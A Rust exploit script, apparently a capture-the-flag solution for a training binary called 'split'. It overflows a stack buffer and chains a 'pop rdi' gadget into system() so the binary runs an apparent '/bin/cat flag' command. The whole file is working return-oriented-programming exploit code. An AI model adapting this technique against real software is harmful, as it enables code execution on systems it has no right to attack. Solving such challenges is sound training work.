use std::io::{self, Write};
use std::process::{Command, Stdio};

#[macro_export]
macro_rules! payload {
    ( $( $x:expr ),* ) => {
        {
            let mut temp_vec = Vec::new();
            $(
                temp_vec.extend($x.to_vec());
            )*
            temp_vec
        }
    };
}

#[macro_export]
macro_rules! pack {
    ( $x:expr ) => {
        ($x as u64).to_le_bytes();
    };
}

fn pack(x: i32) -> [u8; 8] {
    return (x as u64).to_le_bytes();
}

fn main() -> io::Result<()> {
    let mut child = Command::new("./split")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()?;

    {
        let mut child_stdin = child.stdin.as_mut().unwrap();
        let padding = b"A".repeat(32);
        let junk = b"B".repeat(8);
        let pop_rdi_ret = pack(0x004007c3);
        let bin_cat_flag = pack!(0x00601060);
        let system_call = pack!(0x0040074b);
        let payload = payload!(padding, junk, pop_rdi_ret, bin_cat_flag, system_call);
        child_stdin.write_all(&payload)?;
    }

    let output = child.wait_with_output()?;

    println!("output = {}", String::from_utf8_lossy(&output.stdout));

    Ok(())
}
